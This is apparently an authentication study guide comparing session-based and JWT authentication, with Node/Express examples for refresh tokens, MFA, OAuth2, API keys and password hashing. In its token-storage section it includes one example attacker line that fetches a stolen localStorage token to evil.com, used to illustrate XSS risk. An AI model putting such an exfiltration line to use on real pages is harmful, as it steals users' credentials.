# Stateless vs Stateful Authentication

---

## The Core Distinction

```
Stateful (Session-based)          Stateless (Token-based)
────────────────────────          ───────────────────────
Server stores session data        Server stores NOTHING
Client holds only session ID      Client holds all auth data
Every request: DB/cache lookup    Every request: verify signature
Scale: share session store        Scale: just share signing key
Logout: delete server record      Logout: wait for expiry (or blacklist)
```

---

## Stateful Authentication — Sessions

### How It Works

```
1. User logs in
   POST /login { email, password }

2. Server verifies credentials, creates session:
   sessionStore.set('sess_abc123', { userId: 42, role: 'admin', createdAt: ... })

3. Server sends cookie:
   Set-Cookie: sessionId=sess_abc123; HttpOnly; Secure; SameSite=Lax; Path=/

4. Browser stores cookie, sends it on every request:
   Cookie: sessionId=sess_abc123

5. Server looks up session on every request:
   const session = await sessionStore.get(req.cookies.sessionId);
   if (!session) return 401;

6. Logout: delete the record
   sessionStore.delete('sess_abc123')
   res.clearCookie('sessionId')
```

### Express Session Implementation

```js
import session from 'express-session';
import RedisStore from 'connect-redis';
import { createClient } from 'redis';

const redisClient = createClient({ url: process.env.REDIS_URL });
await redisClient.connect();

app.use(session({
  store: new RedisStore({ client: redisClient }),
  secret: process.env.SESSION_SECRET,  // signs the session ID cookie
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,       // not accessible via JS
    secure: true,         // HTTPS only
    sameSite: 'lax',      // CSRF protection
    maxAge: 1000 * 60 * 60 * 24 * 7, // 7 days
  },
  name: 'sid',            // rename from default 'connect.sid'
}));

// Login
app.post('/login', async (req, res) => {
  const user = await verifyCredentials(req.body.email, req.body.password);
  if (!user) return res.status(401).json({ error: 'Invalid credentials' });

  req.session.userId = user.id;
  req.session.role = user.role;
  req.session.save(err => {
    if (err) return res.status(500).json({ error: 'Session error' });
    res.json({ message: 'Logged in' });
  });
});

// Logout
app.post('/logout', (req, res) => {
  req.session.destroy(err => {
    res.clearCookie('sid');
    res.json({ message: 'Logged out' });
  });
});

// Auth middleware
function requireAuth(req, res, next) {
  if (!req.session.userId) return res.status(401).json({ error: 'Unauthorized' });
  next();
}
```

### Session Stores

```
Memory (default)     — dev only, lost on restart, no sharing
Redis                — fast, TTL built-in, horizontally scalable ✅
PostgreSQL           — durable, transactional, slower
MongoDB              — flexible, TTL index

// Redis session pattern
const SESSION_PREFIX = 'sess:';
const TTL = 7 * 24 * 60 * 60; // 7 days in seconds

await redis.setex(`${SESSION_PREFIX}${sessionId}`, TTL, JSON.stringify(sessionData));
const raw = await redis.get(`${SESSION_PREFIX}${sessionId}`);
const session = JSON.parse(raw);
```

---

## Stateless Authentication — JWT / Tokens

### How It Works

```
1. User logs in
   POST /login { email, password }

2. Server verifies credentials, issues signed token:
   const token = jwt.sign(
     { sub: user.id, role: user.role },
     process.env.JWT_SECRET,
     { expiresIn: '15m' }
   );

3. Server sends token (multiple strategies):
   a) Response body → client stores in memory or localStorage
   b) HttpOnly cookie → Set-Cookie: token=...; HttpOnly; Secure

4. Client sends token on every request:
   Authorization: Bearer <token>   // or cookie

5. Server ONLY verifies the signature — no DB lookup:
   const payload = jwt.verify(token, process.env.JWT_SECRET);
   // payload.sub, payload.role available immediately

6. Logout: token lives until expiry (or use a blacklist)
```

### Access Token + Refresh Token Pattern

```
┌────────┐                              ┌────────┐
│ Client │                              │ Server │
└────┬───┘                              └────┬───┘
     │  POST /login                          │
     │─────────────────────────────────────►│
     │                                       │ verify credentials
     │  { accessToken (15m), refreshToken (7d) }
     │◄─────────────────────────────────────│
     │                                       │
     │  GET /api/data                        │
     │  Authorization: Bearer <accessToken>  │
     │─────────────────────────────────────►│
     │                                       │ verify signature only (no DB)
     │  200 data                             │
     │◄─────────────────────────────────────│
     │                                       │
     │  (access token expires)               │
     │                                       │
     │  POST /auth/refresh                   │
     │  { refreshToken }                     │
     │─────────────────────────────────────►│
     │                                       │ lookup refresh token in DB
     │  { new accessToken (15m) }            │ validate, rotate
     │◄─────────────────────────────────────│
```

```js
import jwt from 'jsonwebtoken';
import crypto from 'crypto';

const ACCESS_SECRET  = process.env.JWT_ACCESS_SECRET;
const REFRESH_SECRET = process.env.JWT_REFRESH_SECRET;

// Issue tokens on login
async function issueTokens(userId, role) {
  const accessToken = jwt.sign(
    { sub: userId, role },
    ACCESS_SECRET,
    { expiresIn: '15m', issuer: 'myapp', audience: 'myapp-client' }
  );

  // Refresh token: opaque random string stored in DB
  const refreshToken = crypto.randomBytes(40).toString('hex');
  const expiresAt = new Date(Date.now() + 7 * 24 * 60 * 60 * 1000);

  await db.refreshTokens.insert({
    token: hashToken(refreshToken), // store hash, not plain
    userId,
    expiresAt,
    createdAt: new Date(),
  });

  return { accessToken, refreshToken };
}

// Hash refresh tokens before storage
function hashToken(token) {
  return crypto.createHash('sha256').update(token).digest('hex');
}

// Verify access token middleware
function authenticateToken(req, res, next) {
  const authHeader = req.headers.authorization;
  const token = authHeader?.split(' ')[1]; // "Bearer <token>"
  if (!token) return res.status(401).json({ error: 'No token' });

  try {
    const payload = jwt.verify(token, ACCESS_SECRET, {
      issuer: 'myapp',
      audience: 'myapp-client',
    });
    req.user = { id: payload.sub, role: payload.role };
    next();
  } catch (err) {
    if (err.name === 'TokenExpiredError') return res.status(401).json({ error: 'Token expired' });
    return res.status(403).json({ error: 'Invalid token' });
  }
}

// Refresh endpoint
app.post('/auth/refresh', async (req, res) => {
  const { refreshToken } = req.body;
  if (!refreshToken) return res.status(401).json({ error: 'No refresh token' });

  const hashed = hashToken(refreshToken);
  const stored = await db.refreshTokens.findOne({ token: hashed });

  if (!stored || stored.expiresAt < new Date()) {
    return res.status(401).json({ error: 'Invalid or expired refresh token' });
  }

  // Rotate: delete old, issue new
  await db.refreshTokens.delete({ token: hashed });
  const user = await db.users.findById(stored.userId);
  const tokens = await issueTokens(user.id, user.role);
  res.json(tokens);
});

// Logout: revoke refresh token
app.post('/auth/logout', authenticateToken, async (req, res) => {
  const { refreshToken } = req.body;
  if (refreshToken) {
    await db.refreshTokens.delete({ token: hashToken(refreshToken) });
  }
  res.json({ message: 'Logged out' });
});
```

---

## Side-by-Side Comparison

| Aspect | Stateful (Sessions) | Stateless (JWT) |
|--------|--------------------|--------------------|
| **Server storage** | Required (session store) | Not required |
| **Logout** | Instant — delete record | Delayed — wait for expiry |
| **Horizontal scaling** | Need shared store (Redis) | Any server can verify |
| **Revocation** | Trivial (delete session) | Hard (blacklist or short expiry) |
| **Payload size** | Tiny (just session ID ~36B) | Larger (~200-500B per request) |
| **DB lookup per request** | Yes (session store) | No |
| **Data freshness** | Always current | Stale until token expires |
| **CSRF risk** | Higher (cookie-based) | Lower (if Authorization header) |
| **XSS risk** | Lower (HttpOnly cookie) | Higher (if localStorage) |
| **Microservices** | Harder (each service hits store) | Easier (verify locally) |
| **Mobile apps** | Awkward (cookies) | Natural (Authorization header) |

---

## Where to Store Tokens — Security Tradeoffs

### localStorage / sessionStorage
```
Pros:  Easy to use, persists across tabs (localStorage), simple JS access
Cons:  XSS vulnerability — any injected script can steal the token
       document.cookie is blocked for HttpOnly, but localStorage is not

// Attacker script:
fetch('https://evil.com/steal?token=' + localStorage.getItem('token'));
```

### In-Memory (JS variable / React state)
```
Pros:  XSS can't persist it (cleared on page refresh)
       No storage means no theft via injection
Cons:  Lost on refresh — needs silent refresh mechanism
       Not shared across tabs

// Common pattern: keep access token in memory, refresh token in HttpOnly cookie
let accessToken = null; // in memory

async function getToken() {
  if (!accessToken || isExpired(accessToken)) {
    const res = await fetch('/auth/refresh', { credentials: 'include' });
    const data = await res.json();
    accessToken = data.accessToken; // store in memory only
  }
  return accessToken;
}
```

### HttpOnly Cookies (recommended for web apps)
```
Pros:  JS cannot access — XSS-safe
       Browser auto-sends — easy to use
       Can be Secure + SameSite
Cons:  CSRF risk (mitigated by SameSite=Lax/Strict)
       Doesn't work for cross-origin without CORS + credentials

Set-Cookie: refreshToken=...; HttpOnly; Secure; SameSite=Lax; Path=/auth/refresh
Set-Cookie: accessToken=...;  HttpOnly; Secure; SameSite=Lax; Path=/
```

### Best Practice for Web Apps
```
Access token  → in-memory JS variable (15 min TTL)
Refresh token → HttpOnly cookie (7 day TTL, Path=/auth/refresh)

On load: call /auth/refresh silently → get access token into memory
On 401:  call /auth/refresh → rotate refresh token, get new access token
On logout: call /auth/logout → server deletes refresh token + clears cookie
```

---

## Session Fixation Attack

```
Attack:
1. Attacker visits site, gets session ID: sess_attacker123
2. Attacker tricks victim into using that URL with the session ID
3. Victim logs in — if server doesn't regenerate session, attacker's ID is now authenticated
4. Attacker uses sess_attacker123 to access victim's account

Defense: always regenerate session ID after login
req.session.regenerate((err) => {
  req.session.userId = user.id;
  res.json({ message: 'Logged in' });
});
```

---

## Token Revocation Strategies

```
Problem: JWT is valid until expiry — if stolen, attacker has full access for up to expiry duration

Strategy 1: Short-lived access tokens (15m)
  - Minimizes exposure window
  - Combine with refresh tokens for UX

Strategy 2: Revocation list (blacklist)
  - Store revoked JTI (JWT ID) in Redis
  - Check on every request — adds a DB lookup (undermines stateless benefit)
  redis.set(`revoked:${jti}`, '1', 'EX', ttlUntilExpiry);

Strategy 3: Token versioning
  - Store token_version on user record in DB
  - Include in JWT payload: { sub, version: 3 }
  - On revoke: increment DB version
  - On verify: compare payload.version === user.token_version
  - One DB lookup per request, but can bulk-invalidate all tokens

Strategy 4: Refresh token rotation
  - Never revoke access tokens directly
  - Short access token TTL (5-15m)
  - Revoke refresh token on logout
  - Attacker only has access until current access token expires

// Token versioning implementation
async function authenticateToken(req, res, next) {
  const payload = jwt.verify(token, ACCESS_SECRET);
  const user = await db.users.findById(payload.sub);
  if (user.tokenVersion !== payload.version) {
    return res.status(401).json({ error: 'Token revoked' });
  }
  req.user = user;
  next();
}

// Force logout all sessions (e.g. password change)
await db.users.update({ id: userId }, { tokenVersion: tokenVersion + 1 });
```

---

## Multi-Factor Authentication (MFA)

### TOTP (Time-based One-Time Password)

```
How it works:
- Server generates a shared secret per user (once, at setup)
- Both server and user's authenticator app use: TOTP(secret, Math.floor(Date.now() / 30000))
- 6-digit code changes every 30 seconds
- Server checks current and ±1 window (clock drift)

Apps: Google Authenticator, Authy, 1Password

Implementation with speakeasy:
```

```js
import speakeasy from 'speakeasy';
import QRCode from 'qrcode';

// Setup: generate secret (store in DB, never send again)
app.post('/mfa/setup', authenticateToken, async (req, res) => {
  const secret = speakeasy.generateSecret({
    name: `MyApp (${req.user.email})`,
    length: 32,
  });

  await db.users.update(req.user.id, {
    mfaSecret: encrypt(secret.base32), // encrypt at rest
    mfaEnabled: false, // not enabled until verified
  });

  const qrCodeUrl = await QRCode.toDataURL(secret.otpauth_url);
  res.json({ secret: secret.base32, qrCode: qrCodeUrl });
});

// Verify and enable
app.post('/mfa/verify', authenticateToken, async (req, res) => {
  const user = await db.users.findById(req.user.id);
  const verified = speakeasy.totp.verify({
    secret: decrypt(user.mfaSecret),
    encoding: 'base32',
    token: req.body.code,
    window: 1, // ±30 seconds
  });

  if (!verified) return res.status(400).json({ error: 'Invalid code' });

  await db.users.update(req.user.id, { mfaEnabled: true });
  // Also generate and return backup codes
  const backupCodes = generateBackupCodes(10);
  await db.users.update(req.user.id, { backupCodes: backupCodes.map(hash) });
  res.json({ message: 'MFA enabled', backupCodes });
});

// Login flow with MFA
app.post('/login', async (req, res) => {
  const user = await verifyCredentials(req.body.email, req.body.password);
  if (!user) return res.status(401).json({ error: 'Invalid credentials' });

  if (user.mfaEnabled) {
    // Issue short-lived "MFA pending" token — not a full auth token
    const pendingToken = jwt.sign({ sub: user.id, mfaPending: true }, MFA_SECRET, { expiresIn: '5m' });
    return res.json({ mfaRequired: true, pendingToken });
  }

  const tokens = await issueTokens(user.id, user.role);
  res.json(tokens);
});

// Complete MFA login
app.post('/login/mfa', async (req, res) => {
  const payload = jwt.verify(req.body.pendingToken, MFA_SECRET);
  if (!payload.mfaPending) return res.status(403).json({ error: 'Invalid' });

  const user = await db.users.findById(payload.sub);
  const verified = speakeasy.totp.verify({
    secret: decrypt(user.mfaSecret),
    encoding: 'base32',
    token: req.body.code,
    window: 1,
  });

  if (!verified) return res.status(400).json({ error: 'Invalid MFA code' });

  const tokens = await issueTokens(user.id, user.role);
  res.json(tokens);
});
```

---

## Passkeys / WebAuthn

```
Modern standard replacing passwords:
- Uses public-key cryptography (device stores private key in secure enclave)
- No shared secret — server stores only public key
- Phishing-resistant: key is bound to the exact origin
- Biometrics (Face ID, Touch ID) unlock the private key locally

// Registration (simplified)
app.post('/webauthn/register/begin', authenticateToken, async (req, res) => {
  const options = await generateRegistrationOptions({
    rpName: 'My App',
    rpID: 'myapp.com',
    userID: req.user.id,
    userName: req.user.email,
  });
  // Store options.challenge in session (verify later)
  req.session.webauthnChallenge = options.challenge;
  res.json(options);
});

app.post('/webauthn/register/finish', authenticateToken, async (req, res) => {
  const verification = await verifyRegistrationResponse({
    response: req.body,
    expectedChallenge: req.session.webauthnChallenge,
    expectedOrigin: 'https://myapp.com',
    expectedRPID: 'myapp.com',
  });

  if (verification.verified) {
    await db.credentials.insert({
      userId: req.user.id,
      credentialID: verification.registrationInfo.credentialID,
      publicKey: verification.registrationInfo.credentialPublicKey,
      counter: verification.registrationInfo.counter,
    });
  }
  res.json({ verified: verification.verified });
});
```

---

## OAuth2 Flows Deep Dive

### Authorization Code Flow (web apps, SPAs)

```
         User              Browser           Your Server        Auth Server (Google)
          │                   │                   │                    │
          │  Click "Login      │                   │                    │
          │  with Google"      │                   │                    │
          │──────────────────►│                   │                    │
          │                   │  Redirect to       │                    │
          │                   │  Google OAuth      │                    │
          │                   │──────────────────────────────────────►│
          │                   │                   │  Login page        │
          │                   │◄──────────────────────────────────────│
          │  Enter credentials │                   │                    │
          │──────────────────►│                   │                    │
          │                   │──────────────────────────────────────►│
          │                   │  Redirect back    │                    │
          │                   │  ?code=AUTH_CODE  │                    │
          │                   │◄──────────────────────────────────────│
          │                   │  POST /callback   │                    │
          │                   │  { code }         │                    │
          │                   │──────────────────►│                    │
          │                   │                   │  Exchange code     │
          │                   │                   │──────────────────►│
          │                   │                   │  { access_token,   │
          │                   │                   │    id_token }      │
          │                   │                   │◄──────────────────│
          │                   │  Set session      │                    │
          │                   │◄──────────────────│                    │
```

```js
// Using passport.js + Google OAuth2
import passport from 'passport';
import { Strategy as GoogleStrategy } from 'passport-google-oauth20';

passport.use(new GoogleStrategy({
  clientID: process.env.GOOGLE_CLIENT_ID,
  clientSecret: process.env.GOOGLE_CLIENT_SECRET,
  callbackURL: 'https://myapp.com/auth/google/callback',
  scope: ['profile', 'email'],
}, async (accessToken, refreshToken, profile, done) => {
  // Find or create user
  let user = await db.users.findOne({ googleId: profile.id });
  if (!user) {
    user = await db.users.insert({
      googleId: profile.id,
      email: profile.emails[0].value,
      name: profile.displayName,
    });
  }
  done(null, user);
}));

app.get('/auth/google', passport.authenticate('google'));
app.get('/auth/google/callback',
  passport.authenticate('google', { failureRedirect: '/login' }),
  (req, res) => res.redirect('/dashboard')
);
```

### PKCE (Proof Key for Code Exchange) — for SPAs / Mobile

```
Problem: SPAs and mobile apps can't securely store a client_secret
Solution: PKCE replaces the secret with a per-request code verifier/challenge

code_verifier = random 43-128 char string
code_challenge = BASE64URL(SHA256(code_verifier))

// Step 1: include code_challenge in auth request
GET /authorize?
  response_type=code&
  client_id=SPA_CLIENT&
  code_challenge=BASE64URL_SHA256_OF_VERIFIER&
  code_challenge_method=S256&
  redirect_uri=https://myapp.com/callback

// Step 2: exchange code with verifier (no secret needed)
POST /token
  code=AUTH_CODE
  code_verifier=ORIGINAL_VERIFIER  ← server re-hashes and compares

// Implementation in SPA
const verifier = generateRandomString(128);
const challenge = base64URLEncode(await sha256(verifier));
sessionStorage.setItem('pkce_verifier', verifier);

window.location = `${AUTH_URL}?code_challenge=${challenge}&code_challenge_method=S256&...`;
```

### Client Credentials Flow (machine-to-machine)

```js
// Service A authenticating to Service B — no user involved
const response = await fetch('https://auth.myapp.com/oauth/token', {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: new URLSearchParams({
    grant_type: 'client_credentials',
    client_id: process.env.SERVICE_CLIENT_ID,
    client_secret: process.env.SERVICE_CLIENT_SECRET,
    scope: 'read:users write:orders',
  }),
});
const { access_token } = await response.json();

// Use token for API calls
await fetch('https://api.service-b.com/orders', {
  headers: { Authorization: `Bearer ${access_token}` },
});
```

---

## API Key Authentication

```js
// Simple API key auth (for services/B2B)
// Keys: randomly generated, stored hashed in DB

import crypto from 'crypto';

// Generate API key
function generateApiKey() {
  const key = crypto.randomBytes(32).toString('hex');
  const prefix = 'sk_live_'; // visible, non-secret prefix
  return `${prefix}${key}`;
}

// Store hashed
async function createApiKey(userId, name) {
  const key = generateApiKey();
  const hash = crypto.createHash('sha256').update(key).digest('hex');

  await db.apiKeys.insert({
    hash,
    prefix: key.substring(0, 12), // store first 12 chars for identification
    userId,
    name,
    createdAt: new Date(),
    lastUsedAt: null,
    scopes: ['read'],
  });

  return key; // return ONCE, never again
}

// Middleware
async function apiKeyAuth(req, res, next) {
  const key = req.headers['x-api-key'] || req.headers.authorization?.replace('Bearer ', '');
  if (!key) return res.status(401).json({ error: 'API key required' });

  const hash = crypto.createHash('sha256').update(key).digest('hex');
  const apiKey = await db.apiKeys.findOne({ hash });

  if (!apiKey) return res.status(401).json({ error: 'Invalid API key' });

  // Update last used (async, non-blocking)
  db.apiKeys.update({ hash }, { lastUsedAt: new Date() });

  req.user = { id: apiKey.userId, scopes: apiKey.scopes };
  next();
}
```

---

## Password Hashing

```js
import bcrypt from 'bcrypt';
import argon2 from 'argon2'; // preferred over bcrypt (2023+)

// bcrypt (battle-tested)
const SALT_ROUNDS = 12; // higher = slower = more secure
const hash = await bcrypt.hash(password, SALT_ROUNDS);
const match = await bcrypt.compare(password, hash);

// argon2 (winner of Password Hashing Competition 2015)
// Better: memory-hard, resists GPU/ASIC attacks
const hash = await argon2.hash(password, {
  type: argon2.argon2id,  // recommended variant
  memoryCost: 65536,      // 64 MB
  timeCost: 3,            // 3 iterations
  parallelism: 1,
});
const match = await argon2.verify(hash, password);

// NEVER:
// ❌ MD5, SHA1, SHA256 (fast — GPU can crack billions/sec)
// ❌ Unsalted (rainbow tables)
// ❌ Rolling your own crypto
// ❌ Encrypting passwords (vs hashing) — keys can be stolen
```

---

## Rate Limiting Auth Endpoints

```js
import rateLimit from 'express-rate-limit';
import { RateLimiterRedis } from 'rate-limiter-flexible';

// Basic rate limiter on login
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5,                    // 5 attempts per IP
  skipSuccessfulRequests: true,
  message: 'Too many login attempts, try again later',
});
app.use('/auth/login', loginLimiter);

// Per-user progressive lockout
const loginAttempts = new RateLimiterRedis({
  storeClient: redisClient,
  keyPrefix: 'login_fail_',
  points: 5,     // 5 failures
  duration: 900, // per 15 minutes
  blockDuration: 900, // block for 15 minutes
});

app.post('/auth/login', async (req, res) => {
  try {
    await loginAttempts.consume(req.body.email); // key by email
  } catch (rejRes) {
    const retryAfter = Math.ceil(rejRes.msBeforeNext / 1000);
    res.set('Retry-After', String(retryAfter));
    return res.status(429).json({ error: `Too many attempts. Try again in ${retryAfter}s` });
  }

  const user = await verifyCredentials(req.body.email, req.body.password);
  if (!user) {
    // Don't reveal if email exists
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  await loginAttempts.delete(req.body.email); // reset on success
  const tokens = await issueTokens(user.id, user.role);
  res.json(tokens);
});
```

---

## SSO (Single Sign-On)

### SAML 2.0 (enterprise)
```
Identity Provider (IdP): Okta, Azure AD, ADFS
Service Provider (SP): your app

Flow:
1. User visits your app, not logged in
2. App redirects to IdP with SAML AuthnRequest
3. User logs in to IdP
4. IdP sends SAML Response (XML, signed) to browser
5. Browser POSTs SAML Response to your app's ACS URL
6. App verifies XML signature, extracts user attributes
7. App creates session

Libraries: passport-saml, node-saml
```

### OpenID Connect (modern SSO)
```
OIDC = OAuth2 + Identity Layer
id_token = JWT with user info (sub, email, name, picture)

// Verify id_token from Google
import { OAuth2Client } from 'google-auth-library';
const client = new OAuth2Client(CLIENT_ID);

const ticket = await client.verifyIdToken({
  idToken: req.body.idToken,
  audience: CLIENT_ID,
});
const payload = ticket.getPayload();
// payload.sub = Google user ID
// payload.email = email (only if email scope requested)
```

---

## Security Headers for Auth

```js
import helmet from 'helmet';

app.use(helmet({
  // Prevents clickjacking (embedding in iframe)
  frameguard: { action: 'deny' },

  // Enforce HTTPS
  hsts: { maxAge: 31536000, includeSubDomains: true, preload: true },

  // Prevent MIME sniffing
  noSniff: true,

  // XSS protection (modern browsers use CSP instead)
  xssFilter: true,

  // Content Security Policy — restricts what can load
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],  // no inline scripts (XSS mitigation)
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", 'data:', 'https:'],
      connectSrc: ["'self'", 'https://api.myapp.com'],
    },
  },
}));

// CSRF token for cookie-based session auth
import csrf from 'csurf';
const csrfProtection = csrf({ cookie: { httpOnly: true, sameSite: 'lax' } });

app.use(csrfProtection);
app.get('/csrf-token', (req, res) => res.json({ csrfToken: req.csrfToken() }));
// Include X-CSRF-Token header in all state-changing requests
```

---

## Tricky Interview Questions

**Q: What's the main advantage of stateless (JWT) auth over sessions?**

No server-side storage needed — any server in a cluster can verify a token just by checking the signature. Sessions require every server to hit a shared store (Redis).

**Q: If JWT is stateless, how do you implement logout?**

You can't truly invalidate a JWT before expiry. Options:
1. Short access token TTL (15m) + revocable refresh token
2. Token blacklist in Redis — adds a lookup per request (now "stateful")
3. Token versioning — store a version number in DB, increment on logout

**Q: Why is refresh token rotation important?**

If a refresh token is stolen and used, rotation means the legitimate user's next refresh will detect the reuse (the old token is already gone) and can trigger a full logout/alert. Without rotation, a stolen refresh token is valid indefinitely.

**Q: Where should you store JWTs in a web app?**

- Access token: in-memory (safest against XSS)
- Refresh token: HttpOnly cookie (safe from XSS, mitigate CSRF with SameSite=Lax)
- Never in localStorage for sensitive tokens (XSS accessible)

**Q: What's the difference between authentication and authorization?**

- Authentication: "Who are you?" — verify identity (login)
- Authorization: "What can you do?" — check permissions (RBAC, scopes)

**Q: What is PKCE and why is it needed?**

Proof Key for Code Exchange. In OAuth2, SPAs and mobile apps can't store a `client_secret` securely. PKCE replaces the secret with a per-request cryptographic challenge (hash of a random verifier). The auth server can verify the exchange without a shared secret.

**Q: What's the difference between `private` (TS) JWT key and `secret` (HS256)?**

- HS256: symmetric — same secret signs and verifies. Anyone with the secret can issue tokens.
- RS256/ES256: asymmetric — private key signs, public key verifies. Microservices can verify tokens without access to the signing key.

**Q: Why is bcrypt preferred over SHA-256 for passwords?**

SHA-256 is fast (billions/sec on GPU) — brute-forceable. Bcrypt is intentionally slow, has a cost factor, and is salted per-hash. Argon2 is even better — memory-hard, resists ASIC attacks.

**Q: What is session fixation and how do you prevent it?**

An attacker sets their known session ID before login, victim logs in, now attacker has authenticated session. Prevention: always call `session.regenerate()` after successful login to issue a fresh session ID.

**Q: Can you scale session-based auth horizontally without Redis?**

Yes, with sticky sessions (load balancer routes user to same server always). But this creates uneven load and single points of failure. Redis shared store is the standard solution.

**Q: What's the security risk with `alg: none` in JWT?**

Older JWT libraries allowed `alg: none` — no signature required. Attacker modifies payload and sets `alg: none`. Fix: always explicitly specify allowed algorithms when verifying.
```js
jwt.verify(token, secret, { algorithms: ['HS256'] }); // never trust token's alg header
```
